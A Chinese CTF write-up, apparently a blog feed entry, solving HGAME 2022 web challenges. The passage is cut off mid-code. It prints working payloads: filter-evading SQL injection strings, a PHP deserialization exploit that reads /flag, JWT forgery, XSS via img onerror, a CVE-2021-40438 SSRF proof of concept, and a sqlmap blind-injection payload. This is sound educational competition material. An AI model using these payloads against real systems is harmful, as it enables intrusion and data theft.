    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现&lt;code&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HGAME-Web</title>
    <link href="https://wuyusanhua2021.github.io/2022/02/12/hgame-wp/"/>
    <id>https://wuyusanhua2021.github.io/2022/02/12/hgame-wp/</id>
    <published>2022-02-12T15:46:14.000Z</published>
    <updated>2022-03-03T07:41:31.890Z</updated>
    
    <content type="html"><![CDATA[<h1 id="蛛蛛"><a href="#蛛蛛" class="headerlink" title="蛛蛛"></a>蛛蛛</h1><p>简单爬虫，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;https://hgame-spider.vidar.club/e109015477/&quot;</span></span><br><span class="line">cur = url</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = requests.get(cur)</span><br><span class="line">    key = re.search(<span class="string">r&#x27;\?key=(.*)%3D%3D&#x27;</span>, r.text)</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cur = url + key.group()</span><br><span class="line"><span class="built_in">print</span>(cur)</span><br></pre></td></tr></table></figure><p>抓包，在response报文处即可找到flag</p><p><img src="/2022/02/12/hgame-wp/image-20220121120346224.png" alt="image-20220121120346224"></p><h1 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h1><p>f12-&gt;网络-&gt;ctrl+R，checking.js里面有jsfuck，粘贴到控制台直接输出flag</p><p><img src="/2022/02/12/hgame-wp/image-20220121135219197.png" alt="image-20220121135219197"></p><h1 id="秋名山"><a href="#秋名山" class="headerlink" title="秋名山"></a>秋名山</h1><p>抓包，根据提示在文件头添加：<code>Referer: qiumingshan.net</code>，得</p><p><img src="/2022/02/12/hgame-wp/image-20220121141643941.png" alt="image-20220121141643941"></p><p>修改User-Agent为：<code>User-Agent: Hachi-Roku</code></p><p><img src="/2022/02/12/hgame-wp/image-20220121142643859.png" alt="image-20220121142643859"></p><p>添加：<code>Cookie: flavor=Raspberry</code></p><p><img src="/2022/02/12/hgame-wp/image-20220121143112321.png" alt="image-20220121143112321"></p><p>添加：<code>gasoline: 100</code></p><p><img src="/2022/02/12/hgame-wp/image-20220121143220216.png" alt="image-20220121143220216"></p><p>最后加上：<code>x-real-ip: 127.0.0.1</code></p><p><img src="/2022/02/12/hgame-wp/image-20220121143314194.png" alt="image-20220121143314194"></p><h1 id="ez-auth"><a href="#ez-auth" class="headerlink" title="ez_auth"></a>ez_auth</h1><p>注册账户登录，f12找到token</p><p><img src="/2022/02/12/hgame-wp/image-20220212211617298.png" alt="image-20220212211617298"></p><p>token放到jwt.io解密，修改username,id为admin,1，并删去secret，得到伪造的token，使用伪造的token登录即可得到flag</p><p><img src="/2022/02/12/hgame-wp/image-20220212212506933.png" alt="image-20220212212506933"></p><h1 id="Webpack-Engine"><a href="#Webpack-Engine" class="headerlink" title="Webpack Engine"></a>Webpack Engine</h1><p>f12，在F14g_1s_her3.vue中得flag，两次base64解密即可</p><p><img src="/2022/02/12/hgame-wp/image-20220212215042090.png" alt="image-20220212215042090"></p><h1 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h1><p><code>www.zip</code>源码泄露，登录验证相关代码如下，密码为php弱类型绕过，令password=1080a即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;adm1n&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(alert(<span class="string">&#x27;username or password is invalid&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_numeric(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(alert(<span class="string">&#x27;密码不能设置为纯数字，我妈都知道(￣△￣；)&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="number">1080</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;unique_key&#x27;</span>] = md5(randomString(<span class="number">8</span>));</span><br><span class="line">            header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(alert(<span class="string">&#x27;这你都能输错？&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>审计源码，save.php将用户的输入组合为<code>key | value</code>三部分存储，get.php提示flag在/flag，并且decode()函数中会对<code>key | value</code>重新进行拆分，具体实现代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$data</span></span>): <span class="title">Array</span> </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = [];</span><br><span class="line">    <span class="variable">$offset</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$length</span> = \strlen(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$offset</span> &lt; <span class="variable">$length</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!strstr(substr(<span class="variable">$data</span>, <span class="variable">$offset</span>), <span class="string">&#x27;|&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$pos</span> = strpos(<span class="variable">$data</span>, <span class="string">&#x27;|&#x27;</span>, <span class="variable">$offset</span>);</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$pos</span> - <span class="variable">$offset</span>;</span><br><span class="line">        <span class="variable">$varname</span> = substr(<span class="variable">$data</span>, <span class="variable">$offset</span>, <span class="variable">$num</span>);</span><br><span class="line">        <span class="variable">$offset</span> += <span class="variable">$num</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$dataItem</span> = unserialize(substr(<span class="variable">$data</span>, <span class="variable">$offset</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span>[<span class="variable">$varname</span>] = <span class="variable">$dataItem</span>;</span><br><span class="line">        <span class="variable">$offset</span> += \strlen(serialize(<span class="variable">$dataItem</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要将key的部分改造成<code>key1 | key2</code>就可以利用unserialize，魔术方法已在Evil类中给出，$file可控，可以实现任意文件读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/hgame/&quot;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = <span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> Evil();</span><br><span class="line"><span class="variable">$payload</span>-&gt;file = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;a|&#x27;</span>.serialize(<span class="variable">$payload</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成payload输入即可得到flag</p><h1 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h1><p>网页源码提示<code>/index.php?id=1</code>，当输入id为4就跳转到<code>error.php?code=404</code>，code就是注入点，空格,=以及部分关键词被过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查字段数:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>oorrder<span class="comment">/*1*/</span><span class="keyword">by</span><span class="comment">/*1*/</span><span class="number">2</span>#</span><br><span class="line"></span><br><span class="line">查库名:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>ununionion<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span><span class="number">1</span>,database()#</span><br><span class="line"></span><br><span class="line">查表名:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span><span class="number">1</span>,group_concat(table_name)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>infoorrmation_schema.tables<span class="comment">/*1*/</span>whewherere<span class="comment">/*1*/</span>table_schema<span class="comment">/*1*/</span><span class="keyword">like</span><span class="comment">/*1*/</span>&quot;pokemon&quot;#</span><br><span class="line"></span><br><span class="line">查列名:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span><span class="number">1</span>,group_concat(column_name)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>infoorrmation_schema.columns<span class="comment">/*1*/</span>whewherere<span class="comment">/*1*/</span>table_name<span class="comment">/*1*/</span><span class="keyword">like</span><span class="comment">/*1*/</span>&quot;fllllllllaaaaaag&quot;#</span><br><span class="line"></span><br><span class="line">查flag:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span><span class="number">1</span>,group_concat(flag)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>pokemon.fllllllllaaaaaag#</span><br></pre></td></tr></table></figure><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache!"></a>Apache!</h1><p>复现的时候环境已经无了</p><p>本题的考点是<code>cve-2021-40438</code>，适用范围Apache&lt;=2.4.49，漏洞原理为：</p><blockquote><p>利用apache函数缺陷，构造可控的反向代理：Apache在正常情况下，因为识别到了unix套接字，所以会把用户请求发送给这个本地文件套接字，而不是后端URL。使unix套接字过长，就会返回空，请求就会发送给后端的url。具体说明：当远程在目标环境（服务器）使用了mod_proxy做反向代理，比如ProxyPass /  “<a href="http://localhost:8000/&quot;%EF%BC%8C%E6%AD%A4%E6%97%B6%E9%80%9A%E8%BF%87%E8%AF%B7%E6%B1%82http://target/?unix:%7B&#39;A&#39;*5000}|http://example.com/%E5%8D%B3%E5%8F%AF%E5%90%91**http://%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9C%B0%E5%9D%80%E6%88%96%E8%87%AA%E5%B7%B1%E5%8F%AF%E6%8E%A7%E7%9A%84%E7%BD%91%E7%AB%99.com**%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%EF%BC%88%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E5%B0%B1%E6%98%AF%E4%BB%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%91%E8%B5%B7%E7%9A%84%E5%90%91%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AF%B7%E6%B1%82%EF%BC%89%EF%BC%8C%E9%80%A0%E6%88%90%E4%B8%80%E4%B8%AASSRF%E6%94%BB%E5%87%BB%E3%80%82">http://localhost:8000/&quot;，此时通过请求http://target/?unix:{&#39;A&#39;*5000}|http://example.com/即可向**http://自己的地址或自己可控的网站.com**发送请求（这个请求就是从服务端发起的向自己的请求），造成一个SSRF攻击。</a></p></blockquote><p>poc为<code>http://target/?unix:&#123;&#39;A&#39;*5000&#125;|http://example.com/</code>，若不使用Apache作为代理服务器，则需要加上代理服务器</p><h1 id="At0m的留言板"><a href="#At0m的留言板" class="headerlink" title="At0m的留言板"></a>At0m的留言板</h1><p>hint:<br> 1.留言板正在尝试图片留言的兼容性测试<br> 2.flag的名字被改了</p><p>留言板网页源码就有暗示，看了官方wp才知道</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> auth0r = <span class="string">&#x27;at0m&#x27;</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> flag = <span class="string">&#x27;hgame&#123;xxx&#125;&#x27;</span>;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用var定义的flag是全局变量，可以用Object.key(window)查看flag的变量名</p><p>根据hint1有<code>&lt;img src=x.png onerror=&quot;document.getEmploymentsByClassName(&#39;content&#39;)[0].innerText = Object.key(window)&quot;&gt;</code></p><p>得到flag变量名F149_is_Here</p><p>接下来直接查看它<code>&lt;img src=x.png onerror=&quot;document.getEmploymentsByClassName(&#39;content&#39;)[0].innerText = &quot;F149_is_Here&quot;&gt;</code></p><h1 id="Security-Center"><a href="#Security-Center" class="headerlink" title="Security Center"></a>Security Center</h1><p>网页源码有提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hint: /vendor/composer/installed.json --&gt;</span></span><br></pre></td></tr></table></figure><p>转去该页面得关键信息：网站使用twig3.3.7模版</p><p><img src="/2022/02/12/hgame-wp/image-20220212233024313.png" alt="image-20220212233024313"></p><p>回到首页点击跳转链接，来到<code>redirect.php?url=URL</code>，经过测试url就是模板注入点</p><p>网上找到相关payload，cat,tac命令被过滤，可以写webshell，也可以base64命令直接输出flag</p><h1 id="Vider-shop-Demo"><a href="#Vider-shop-Demo" class="headerlink" title="Vider shop Demo"></a>Vider shop Demo</h1><p>环境也无了，比赛时的思路很简单，10000元可以买flag，但是账户里只有9999元，同时购物车里有一些订单，支付会扣除相应的金额，撤销支付也会返回支付的金额，新建一个订单，点之前已有的订单退款，抓包，把新建订单的id输入，放包，账户余额就会超过10000，买flag付款即可，但week3的官方wp给出的解法是条件竞争，之后一定学学条件竞争</p><h1 id="LoginMe"><a href="#LoginMe" class="headerlink" title="LoginMe"></a>LoginMe</h1><p>第一次遇到非MySQL的sql注入题，用的是SQLite，有一篇总结SQLite注入的<a href="https://lanvnal.com/2020/12/08/sqlite-zhu-ru-de-yi-dian-zong-jie/">博客</a></p><p>题目使用sqlmap的<code>--data </code>命令能一把梭，爆出admin密码，然后登录admin用户就能得到flag，分析一下sqlmap生成的盲注文件</p><p>随机抽取一个payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;test&#x27;) AND SUBSTR((SELECT COALESCE(sql,CHAR(32)) FROM sqlite_master WHERE tbl_name=CHAR(117,117,117,115,115,115,101,101,101,114,114,114,115,115,115) LIMIT 1),1,1)=CHAR(117) AND (&#x27;Hxna&#x27;=&#x27;Hxna&quot;,&quot;password&quot;:&quot;test&quot;&#125;</span><br></pre></td></tr></table></figure><p>这里是在爆列名，其中用到了一个函数COALESCE()，查了一下资料，SqlServer/MySql/Oracle/PostgreSql/Sqlite均支持该函数，用法如下：</p><p><img src="/2022/02/12/hgame-wp/image-20220213205858681.png" alt="image-20220213205858681"></p><p>所以语句的意思就是判断创建uuussseeerrr表的<code>sql</code>语句的第n个字符是否符合条件，是则返回该字符，否则返回char(32)，盲注脚本就很好反推了：二分查找，返回char(32)就break，返回其它值就添加到result。又get了一种用coalesce的盲注方式</p><h1 id="Markdown-Online"><a href="#Markdown-Online" class="headerlink" title="Markdown Online"></a>Markdown Online</h1><p>controller.js里有关于登录验证的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.body.username === <span class="string">&quot;admin&quot;</span> &amp;&amp; req.body.password.length === <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            req.body.password = req.body.password.toUpperCase()</span><br><span class="line">            <span class="keyword">if</span> (req.body.password !== <span class="string">&#x27;54gkj7n8uo55vbo2&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.status(<span class="number">403</span>).json(&#123;<span class="attr">msg</span>: <span class="string">&#x27;invalid username or password&#x27;</span>&#125;)</span><br><span class="line">                ......</span><br></pre></td></tr></table></figure><p>用数组绕过长度验证，发包得到cookie</p><p><img src="/2022/02/12/hgame-wp/image-20220218162700441.png" alt="image-20220218162700441"></p><p>接下来进入<code>/md</code>路由，有<code>preview</code>,<code>submit</code>按钮，继续审计controller.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> blacklist = <span class="regexp">/__proto__|prototype|\+|alert|confirm|escape|parseInt|parseFloat|prompt|isNaN|new|this|process|constructor|atob|btoa|apk/i</span></span><br><span class="line">    <span class="keyword">if</span> (code.match(blacklist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;# Hacker!&quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubmitController</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.code &amp;&amp; <span class="keyword">typeof</span> req.body.code === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> code = waf(req.body.code)</span><br><span class="line">        <span class="keyword">const</span> source = md.render(code)</span><br><span class="line">        <span class="keyword">const</span> browser = <span class="keyword">new</span> Browser()</span><br><span class="line">        browser.load(source, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> source = hljs.highlight(browser.html(), &#123;<span class="attr">language</span>: <span class="string">&quot;html&quot;</span>&#125;).value</span><br><span class="line">            res.json(&#123;source&#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.status(<span class="number">500</span>).send(<span class="string">&quot;code is required&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把code用waf过滤一次，再进行md渲染，跟进browser.load()，browzer导入了zombie，查看zombie中的load()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">load</span>(<span class="params">html, callback</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.window)</span><br><span class="line">      <span class="built_in">this</span>.tabs.close(<span class="built_in">this</span>.window);</span><br><span class="line">    <span class="built_in">this</span>.errors = [];</span><br><span class="line">    <span class="built_in">this</span>.tabs.open(&#123; <span class="attr">html</span>: html &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._wait(<span class="literal">null</span>, callback);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>调用了this.tabs.open()，跟进</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">open</span>(<span class="params">options = &#123;&#125;</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> named = options.name &amp;&amp; <span class="built_in">this</span>.find(options.name.toString());</span><br><span class="line">    <span class="keyword">if</span> (named) &#123;</span><br><span class="line">      <span class="built_in">this</span>._current = named;</span><br><span class="line">      <span class="keyword">if</span> (options.url)</span><br><span class="line">        <span class="built_in">this</span>._current.location = options.url;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>._current;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> active = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">const</span> open = createHistory(<span class="built_in">this</span>._browser, <span class="function">(<span class="params"><span class="built_in">window</span></span>)=&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!Tabs.sameWindow(<span class="built_in">window</span>, active)) &#123;</span><br><span class="line">        <span class="keyword">const</span> index = <span class="built_in">this</span>._indexOf(active);</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>)</span><br><span class="line">          <span class="built_in">this</span>[index] = <span class="built_in">window</span>;</span><br><span class="line">        <span class="built_in">this</span>.current = active = <span class="built_in">window</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">window</span>)</span><br><span class="line">        <span class="built_in">this</span>._browser._eventLoop.setActiveWindow(<span class="built_in">window</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> name = options.name === <span class="string">&#x27;_blank&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : (options.name || <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    options.name = name;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">window</span> = open(options);</span><br><span class="line">    <span class="built_in">this</span>.push(<span class="built_in">window</span>);</span><br><span class="line">    <span class="keyword">if</span> (name &amp;&amp; (<span class="built_in">this</span>.propertyIsEnumerable(name) || !<span class="built_in">this</span>[name]))</span><br><span class="line">      <span class="built_in">this</span>[name] = <span class="built_in">window</span>;</span><br><span class="line">    <span class="built_in">this</span>.current = active = <span class="built_in">window</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">window</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>open()返回值<code>window</code>来自于函数内部open变量代表的函数调用后的结果，跟进createHistory()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">createHistory</span>(<span class="params">browser, focus</span>) </span>&#123;</span><br><span class="line">  assert(browser &amp;&amp; browser.visit, <span class="string">&#x27;Missing parameter browser&#x27;</span>);</span><br><span class="line">  assert(focus &amp;&amp; focus.call, <span class="string">&#x27;Missing parameter focus or not a function&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> history = <span class="keyword">new</span> History(browser, focus);</span><br><span class="line">  <span class="keyword">return</span> history.open.bind(history);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>又调用了History.open，跟进History对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">History</span> </span>&#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="function"><span class="title">open</span>(<span class="params">args</span>)</span> &#123;</span><br><span class="line">    args.browser = <span class="built_in">this</span>.browser;</span><br><span class="line">    args.history = <span class="built_in">this</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">document</span>  = loadDocument(args);</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">window</span>    = <span class="built_in">document</span>.defaultView;</span><br><span class="line">    <span class="built_in">this</span>.addEntry(<span class="built_in">window</span>, args.url);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">window</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进loadDocument()函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">loadDocument</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">    ......</span><br><span class="line"><span class="keyword">if</span> (<span class="regexp">/^javascript:/</span>.test(url)) &#123;</span><br><span class="line">    <span class="built_in">window</span>._eventQueue.enqueue(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">document</span>.close();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">window</span>._evaluate(url.slice(<span 